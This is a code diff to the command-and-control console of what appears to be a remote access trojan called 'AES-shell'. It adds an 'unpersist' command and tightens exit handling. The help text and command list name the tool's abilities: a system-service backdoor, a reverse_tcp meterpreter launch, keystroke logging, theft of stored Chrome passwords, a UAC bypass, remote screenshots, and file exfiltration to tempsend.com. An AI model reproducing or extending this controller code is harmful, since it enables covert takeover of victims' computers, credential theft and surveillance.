@@ -129,7 +129,7 @@ def fmainloop(first):											## This loop is used to accept a new connection
 
 def fhelp():
 	if isWindows:
-		return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n  screenshot          -  Take a screenshot of the remote desktop.**n  proxyupdate file    -  Update proxy list from file.**n'
+		return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  unpersist           -  Remove persistence and exit.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n  screenshot          -  Take a screenshot of the remote desktop.**n  proxyupdate file    -  Update proxy list from file.**n'
 	else:
 		return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n'
 
@@ -218,7 +218,7 @@ while True:
 			cfrom = ' (Proxy)'
 
 		if isWindows:
-			commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ', 'tempsend ', 'screenshot', 'proxyupdate ']
+			commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ', 'tempsend ', 'screenshot', 'proxyupdate ', 'unpersist']
 		else:
 			commands = ['download ', 'upload ', 'wget ', 'tempsend ', 'run ']
 		try:
@@ -256,6 +256,9 @@ while True:
 
 	elif decrypted[28:32] == 'WTF1':							## Print the output of bypassuac commands
 		print decrypted[32:]
+		if decrypted.endswith('uninstalled.**n'):
+			s.close()
+			sys.exit()
 		fnextcmd()
 
 	else:														## Print the normal output
@@ -263,7 +266,7 @@ while True:
 			print decrypted
 		else:
 			print ' [X] Decryption Error from %s!' % (address[0])
-			#exit()
+			exit()
 	try:
 		if nextcmd == 'exit' or nextcmd == 'quit':
 			c.close()
